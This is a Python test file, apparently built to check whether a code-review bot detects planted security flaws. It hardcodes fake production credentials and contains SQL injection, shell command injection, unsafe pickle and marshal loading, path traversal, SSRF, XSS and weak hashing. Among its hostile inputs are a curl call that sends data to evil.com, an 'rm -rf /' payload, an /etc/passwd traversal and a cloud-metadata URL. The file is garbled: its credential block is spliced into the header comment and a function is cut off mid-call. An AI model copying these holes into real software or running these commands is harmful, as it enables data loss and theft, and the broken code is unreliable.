#!/usr/bin/env python3
"""
🚨 JUICY VULNERABILITIES TEST - PR #13
Testing the bot's ability to detect obvious security vulnerabilities.
This file contains multiple critical vulnerabilities that should be easily detected.
"""

import os
import subprocess
import base64
import hashlib
import sqlite3
import json
import urllib.request
import pickle
import marshal

# 🚨 CRITICAL: Hardcoded production t('users.db')
    cursor = conn.cursor()
    cursor.execute(query)  # 🚨 SQL Injection!
    result = cursor.fetchone()
    conn.close()
    return result

def command_injection(user_input):
      """
          🚨 CRITICAL: Command injection vulnerability
              """
      # Direct command execution with user input
    os.system(f"echo 'User: {user_input}' > /tmp/user_log.txt")  # 🚨 Command injection!
    
    # More command injection
    subprocess.run(f"ls -la {user_input}", shell=True)  # 🚨 Command injection!
    
    # Even more dangerous
    os.system(f"curl -X POST http://evil.com/steal?data={user_input}")  # 🚨 Command injection!

def information_disclosure():
      """
          🚨 CRITICAL: Information disclosure
              """
      # Print all secrets
    print(f"Database password: {DATABASE_PASSWORD}")
    print(f"API secret: {API_SECRET_KEY}")
    print(f"AWS credentials: {AWS_ACCESS_KEY_ID}:{AWS_SECRET_ACCESS_KEY}")
    print(f"Stripe key: {STRIPE_SECRET_KEY}")
    print(f"JWT secret: {JWT_SECRET}")
    print(f"GitHub token: {GITHUB_TOKEN}")

def weak_cryptography():
      """
          🚨 CRITICAL: Weak cryptography
              """
      # MD5 is broken
    weak_hash = hashlib.md5(DATABASE_PASSWORD.encode()).hexdigest()
    print(f"Weak MD5 hash: {weak_hash}")
    
    # SHA1 is also weak
    weak_sha1 = hashlib.sha1(DATABASE_PASSWORD.encode()).hexdigest()
    print(f"Weak SHA1 hash: {weak_sha1}")

def unsafe_deserialization():
      """
          🚨 CRITICAL: Unsafe deserialization
              """
      # Pickle is dangerous
    malicious_pickle = base64.b64encode(b"malicious_pickle_data").decode()
    pickle.loads(base64.b64decode(malicious_pickle))  # 🚨 Unsafe deserialization!
    
    # Marshal is also dangerous
    marshal.loads(b"malicious_marshal_data")  # 🚨 Unsafe deserialization!

def path_traversal(filename):
      """
          🚨 CRITICAL: Path traversal vulnerability
              """
      # No validation of file path
    with open(filename, 'r') as f:  # 🚨 Path traversal!
              content = f.read()
              print(f"File content: {content}")
      
def ssrf_vulnerability(url):
      """
          🚨 CRITICAL: Server-Side Request Forgery
              """
      # No URL validation
    response = urllib.request.urlopen(url)  # 🚨 SSRF!
    return response.read()

def xss_vulnerability(user_input):
      """
          🚨 CRITICAL: XSS vulnerability
              """
      # No output encoding
    html = f"<div>User input: {user_input}</div>"  # 🚨 XSS!
    return html

def insecure_random():
      """
          🚨 CRITICAL: Insecure random number generation
              """
      import random
      # Using predictable random
    session_id = random.randint(1000, 9999)  # 🚨 Insecure random!
    return session_id

def main():
      """
          Main function that demonstrates all vulnerabilities
              """
      print("🚨 Testing Juicy Vulnerabilities - PR #13")
      
      # Test SQL injection
    vulnerable_login("admin'; DROP TABLE users; --", "password")
    
    # Test command injection
    command_injection("; rm -rf /")
    
    # Test information disclosure
    information_disclosure()
    
    # Test weak cryptography
    weak_cryptography()
    
    # Test unsafe deserialization
    unsafe_deserialization()
    
    # Test path traversal
    path_traversal("../../../etc/passwd")
    
    # Test SSRF
    ssrf_vulnerability("http://169.254.169.254/latest/meta-data/")
    
    # Test XSS
    xss_vulnerability("<script>alert('XSS')</script>")
    
    # Test insecure random
    insecure_random()
    
    print("✅ All vulnerabilities tested")

if __name__ == "__main__":
      main()credentials
DATABASE_PASSWORD = "prod_admin_password_123!"
API_SECRET_KEY = "sk-live-prod-abcdef1234567890"
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
STRIPE_SECRET_KEY = "sk_live_51234567890abcdef"
JWT_SECRET = "super_secret_jwt_key_12345"
GITHUB_TOKEN = "ghp_1234567890abcdef1234567890abcdef12345678"

def vulnerable_login(username, password):
      """
          🚨 CRITICAL: SQL Injection vulnerability
              """
      # Direct string concatenation - SQL injection
      query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
      print(f"Executing: {query}")

    # Execute without parameterization
      conn = sqlite3.connec
